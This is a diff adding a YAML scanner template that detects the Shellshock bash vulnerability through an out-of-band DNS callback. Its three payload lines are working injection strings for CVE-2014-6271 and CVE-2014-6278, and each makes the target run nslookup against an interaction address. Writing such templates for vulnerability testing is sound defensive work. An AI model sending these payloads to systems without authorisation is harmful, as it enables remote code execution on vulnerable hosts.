@@ -1,0 +1,25 @@
+id: "shellshock"
+issue_code: "shellshock"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 100
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+templates:
+  # CVE-2014-6271
+  - '() { :;}; /usr/bin/nslookup {{.oob_address}}'
+  - '() { :; }; /bin/bash -c "nslookup {{.oob_address}}"'
+  
+  # CVE-2014-6278 
+  - '() { _; } >_[$($())] { /usr/bin/nslookup {{.oob_address}}; }'
+categories:
+  - shellshock
+  - cve
+  - oob
+  - rce
+platforms:
+  - linux
+  - unix
